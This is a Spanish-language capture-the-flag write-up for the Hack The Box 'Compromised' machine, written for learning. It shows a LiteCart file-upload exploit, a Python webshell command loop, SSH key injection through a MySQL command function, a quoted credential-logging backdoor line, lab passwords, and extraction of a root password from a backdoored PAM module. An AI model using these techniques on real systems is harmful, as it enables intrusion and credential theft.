---
layout: post
title: Write-Up Máquina Compromised HTB
date: 2021-01-23 16:00 +0800
last_modified_at: 2021-01-23 16:10 +0800
tags: [htb, writeup, incident-response, mysql, php, binary exploitation, Linux]
toc:  true
---

![Compromised-card](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-card.png)

---
## introducción

La máquina compromised es una máquina linux de 64 bits la cual tiene un nivel alto de dificultad. Esta máquina esta muy orientada a incident response, por lo que la enumeración en esta máquina es clave.
La explotación inicial de esta máquina consiste en un arbitray file upload a traves de la plataforma de e-comerce LiteCart ([CVE-2018-12256](https://www.cvedetails.com/cve-details.php?cve_id=CVE-2018-12256)). Con esto obtendremos una webshell muy limitada, ya que tenemos muchas funciones de php deshabilitadas. Una vez tengamos la shell, obtendremos unas credenciales de mysql y con ellas podremos inyectar nuestra pubkey a las authorized keys y por tanto obtener una sesion de ssh como mysql. Tendremos que hacer un movimiento lateral obteniendo unas credenciales para pasar al usuario sysadmin. Para la escalada de privilegios, vamos a tener que analizar el modulo de kernel pam_unix.so para extraer la password de root de los atacantes.

---
## Escaneo

![Compromised-scan](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-scan.png)

La máquina cuenta con dos puertos abiertos:
* Puerto 22: SSH
* puerto 80: HTTP (apache/2.4.29)

### puerto 22

En el puerto 22 nos encontramos con un ssh. Por ahora no nos interesa ya que no tenemos credenciales y no parece vulnerable.

### Puerto 80

En el puerto 80, nos encontramos una web. Si accedemos nos encontramos que directamente nos redirige al directorio /shop/en. En este directorio nos encontramos una tienda en la cual se venden patitos de goma. Mirando la web, también nos damos cuenta que el directorio shop, corresponde a la plataforma de e-comerce litecart.

![Compromised-shop](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-shop-1.png)

Ya que tenemos un servidor web, vamos a analizarlo desde la raiz con la herramienta gobuster en busca de otros directorios de interes.

![Compromised-gobuster](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-gobuster.png)

En el escaneo ha aparecido el directorio backup. Este directorio es muy interesante, ya que puede contener fichero internos del lado del servidor, los cuales no son accesibles desde cliente. Vamos a acceder y ver que contiene.

![Compromised-backup](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-backup.png)

---
## Enumeración

El directorio backup es un `index of`, lo que quiere decir que los fichero que contiene se listan. En este caso tenemos un archivo llamado a.tar.gz, el cual podemos descargar. Una vez descargado, lo descomprimimos para ver su contenido. Esto lo hacemos ejecutando el comando tar -xvf a.tar.gz

![Compromised-tar-gz](/assets/imagenes/2021-01-23-compromised-HTB/Compormised-tar-gz.png)

Al descomprimirlo nos aparece el directorio shop, que es el mismo del que tira la web. Buscando dentro de este backup, en /shop/admin, encontramos un fichero llamado login.php.

```php
<?php
  require_once('../includes/app_header.inc.php');

  document::$template = settings::get('store_template_admin');
  document::$layout = 'login';

  if (!empty($_GET['redirect_url'])) {
    $redirect_url = (basename(parse_url($_REQUEST['redirect_url'], PHP_URL_PATH)) != basename(__FILE__)) ? $_REQUEST['redirect_url'] : document::link(WS_DIR_ADMIN);
  } else {
    $redirect_url = document::link(WS_DIR_ADMIN);
  }

  header('X-Robots-Tag: noindex');
  document::$snippets['head_tags']['noindex'] = '<meta name="robots" content="noindex" />';

  if (!empty(user::$data['id'])) notices::add('notice', language::translate('text_already_logged_in', 'You are already logged in'));

  if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }

  if (empty($_POST['username']) && !empty($_SERVER['PHP_AUTH_USER'])) $_POST['username'] = !empty($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : '';

  $page_login = new view();
  $page_login->snippets = array(
    'action' => $redirect_url,
  );
  echo $page_login->stitch('pages/login');

  require_once vmod::check(FS_DIR_HTTP_ROOT . WS_DIR_INCLUDES . 'app_footer.inc.php');
  ```

En este fichero encontramos una linea comentada:

    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);  

La funcionalidad de esta linea, es escribir en el fichero .log2301c9430d8593ae.txt el username y la password introducidos en el formulario de login.

Si accedemos desde la web a ese fichero, nos aparecerá la password del user admin.

![Compromised-admin-pass](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-admin-pass.png)

  - URL: [http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt](http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt)
  - Contenido: User: admin Passwd: theNextGenSt0r3!~

Enumerando un poco más en profundidad los directorios y los ficheros, nos encontramos un fichero interesante llamado config.inc.php dentro del directorio /shop/includes. En este fichero, nos encontramos con unas credenciales de root para mysql que nos serviran más adelante.

```php
######################################################################
## Database ##########################################################
######################################################################

// Database
  define('DB_TYPE', 'mysql');
  define('DB_SERVER', 'localhost');
  define('DB_USERNAME', 'root');
  define('DB_PASSWORD', 'changethis');
  define('DB_DATABASE', 'ecom');
  define('DB_TABLE_PREFIX', 'lc_');
  define('DB_CONNECTION_CHARSET', 'utf8');
  define('DB_PERSISTENT_CONNECTIONS', 'false');
  ```

---
## Explotación

Una vez tenemos el backup bien enumerado, vamos a proceder a hacer uso de las credenciales de administrador que tenemos de la plataforma.

![Compromised-login](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-login.png)

  - URL: [http://10.10.10.207/shop/admin/login.php](http://10.10.10.207/shop/admin/login.php)

una vez logeados, veremos que la version de litecart que esta corriendo es la 2.1.2, la cual es vulnerable a *Arbitrary File Upload*.

  - Producto y versión: Litecart 2.1.2
  - CVE: [CVE-2018-12256](https://www.cvedetails.com/cve-details.php?cve_id=CVE-2018-12256)
  - Exploit: [https://www.exploit-db.com/exploits/45267](https://www.exploit-db.com/exploits/45267)

En este caso la vulnerabilidad se encuentra en el modulo vqmod, el cual permite subir ficheros xml, pero no realiza una comprobación correcta de los mismos, ya que solo comprueba el parametro content-type. Esto deriva en la posibilidad de subir fichero de otro tipo.
  - vQmod Docs: [http://docs.opencart.com/en-gb/administration/vqmod/](http://docs.opencart.com/en-gb/administration/vqmod/) 

En este caso queremos subir un fichero php con la funcion `phpinfo()` para comprobar si tenemos alguna limitación.
En mi caso el exploit que lo hace de manera aoutmatica no me funciono, por lo que voy a hacerlo de manera manual utilizando burpsuite.

* En el panel de administracion vamos a la pestaña de vQmods, buscamos el fichero que queramos subir y le damos a upload. ![Compromised-upload](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-vQmod.png)
* Paramos la petición con burp y cambiamos el content-Type de x-php a xml. ![Compromised-phpinfo-upload](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-phpinfo-upload.png)

Una vez hemos subido nuestro phpinfo.php vamos a comprobar que podemos y que no podemos hacer.

![Compromised-disabled-funcs-php](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-disabled-functions-php.png)

En este caso tenemos muchas funciones desanlilitadas, entre ellas system,passthru,popen,shell_exec,proc_open,exec...
Esta funciones son las que se utilizan genralmente para obtener una shell. Realizando investigaciones sobre posibles formas de bypassear esas Disabled_Functions encontre en exploitdb una webshell que nos permite bypassear dichas restricciones [https://www.exploit-db.com/exploits/47462](https://www.exploit-db.com/exploits/47462).
Esta webshell hay que modificarla, ya que esta hecha de tal forma que solo ejecuta un comando. Si **pwn("uname -a");** lo cambiamos por **pwn($_REQUEST['cmd']);;** podemos pedirle el comando que queramos a traves del parametro `cmd`.

Adicionalmente a esto y para hacer la explotación de la maquina más fácil, he desarrollado una pequeña herramienta para hacer los requests de una manera mas rápida y dinámica.
En este caso mi webshell se llama exploit.php y el parametro para los comandos es *cmd*.

```python
import os
import requests
import readline

readline.parse_and_bind('tab: complete')
readline.parse_and_bind('set editing-mode vi')

cmd=''
head=''

while cmd != 'exit':
    r = requests.get('http://10.10.10.207/shop/vqmod/xml/exploit.php', params={"cmd": "echo $(whoami)@$(hostname): "})
    cmd = input(r.text.rstrip())
    print("\n")
    c = requests.get('http://10.10.10.207/shop/vqmod/xml/exploit.php', params={"cmd": cmd})
    print(c.text)

```

---
## Usuario www-data

Una vez tenemos subida nuestra webshell podemos proceder a la enumeración. Lo primero que vamos a comprobar es el usuario que somos en el sistema.

![Compromised-id-www-data](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-id-www-data.png)

Normalmente el usuario www-data suele ser un usuario sin privilegios, ya que es el encargado de gestionar el servidor web que corresponda. En este caso y como era de esperar es un usuario sin privilegios.

Como habíamos visto antes en el backup había un fichero llamado config.inc.php dentro del directorio includes que contenia una contraseña de root para la base de datos. 

- User: root
- Password: changethis

![compromised-mysql-non-interactive](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-mysql-non-interactive.png)

Si intentamos iniciar session vemos que no pasa nada. Esto es debido a que no tenemos una shell interactiva, pero podemos seguir interactuando con el servicio a traves del parametro -e.

![compromised-show-databases](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-show-databases.png)

Como podemos ver si que podemos interactuar con la base de datos. Ahora vamos a intentar enumerar posibles funciones que podamos usar para hacer un movimiento lateral al usuario mysql, que es el encargado de correr la base de datos.

![Compromised-mysql-funcs](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-mysql-funcs.png)

Con esa funcion de mysql, podemos ejecutar comandos de sistema. Para este caso, vamos a generar un par de claves rsa con el commando `ssh-keygen -t rsa` y vamos a inyectar nuestra clave pública a las authorized keys del ususario mysql.

Esto lo haremos usando el siguiente comando:

![compromised-pubkey](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-pubkey.png)

    mysql -u root -p'changethis' -e "select exec_cmd('echo <Tu Clave Pública> > ~/.ssh/authorized_keys')"

![Compromised-mysql-ssh](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-mysql-ssh.png)

---
## Usuario mysql

Una vez hemos accedido por SSH con el usuario mysql, vamos a proceder a enumerar la maquina con el usuario. Si ejecutamos `ls -al` en el home del ususario mysql vemos que hay varios archivos. Si ejecutamos `cat * | grep pass` para buscar contraseñas en todos los ficheros, nos dara error, ya que, hay también varias carpetas.
Si vamos fichero por fichero buscando, nos encontramos con que el fichero strace-log.dat contiene varias contraseñas para el servicio mysql. Podemos deducir que la ultima password que aparece no es la que actualmente autentica al usuario root en el servicio mysql.

![Compromised-strace-log-dat](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-strace-log-dat.png)
  - 3*NLJE32I$Fe


Si ejecutamos `ls -al` en /home, vemos que hay un usuario llamado sysadmin. Sabiendo todo esto vamos a comprobar si la contraseña que acabamos de encontrar es válida para dicho usuario.

![Compromised-sysadmin](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-sysadmin.png)

---
## Usuario sysadmin

![Compromised-flag-user](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-flag-user.png)

Una vez tenemos el Usuario, vamos a proceder a enumerar la máquina en busca de posibles rutas por las que escalar privilegios. Recordemos que es una máquina orientada a incident response, por lo que todo lo que necesitamos ya lo tenemos. En mi caso, lo primero que analicé fue la integridad de los paquetes del sistema.

![Compromised-package-integrity-check](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-package-integrity-check.png)

Llama la atencion que el md5 de el fichero pam_unix.so no coincida con el original. Esto puede significar que el atacante se ha aprovechado de una vulnerabilidad de la pam y a instalado ahí una [backdoor](https://github.com/zephrax/linux-pam-backdoor).

  * [https://x-c3ll.github.io/posts/PAM-backdoor-DNS/](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)

---
## Escalada de privilegios

Para la escalada de privilegios, vamos a descargar en nuestra máquina el binario `pam_unix.so` y vamos a analizarlo con radare2:
  * scp sysadmin@10.10.10.207:/lib/x86_64-linux-gnu/security/pam_unix.so ./pam_unix.so
  ![Compromised-pam-so](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-pam-so.png)

Una vez en nuestra maquina vamos a proceder a analizarlo con radare2. En mi caso estoy utilizando la interfaz gráfica de radare2 llamada cutter.

Si nos vamos a la funcion sym.pam_sm_authenticate, más concretamente al registro de memoria 0x00003195 encontramos una string muy interesante. Justo debajo encontramos otra string. Si las juntamos resulta ser la password utilizada por los atacantes para obtener persistencia como root en la máquina.

![compromised-radare2-root-password](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-pam-radare.png)

La pasword resultante sería la siguiente:
* zlke~U3Env82m2-

![Compromised-root](/assets/imagenes/2021-01-23-compromised-HTB/Compromised-root.png)

Ya somos root.

---
## Bonus Track

Si miramos bien el servicio SSH y su configuración, vemos que la opción `PermitRootLogin` esta seteada a yes, pero si intentamos logearnos por SSH com root no nos deja. Esto es debido a que la backdoor que implanto el atacante afecta al sistema de autenticacion PAM, pero si nos fijamos bien en el fichero de configuración de SSH (/etc/ssh/sshd_config), vemos que la opción `UsePAM` esta en no. Si cambiamos el valor a yes ya podremos loguearnos como root en el sistema directamente por SSH. 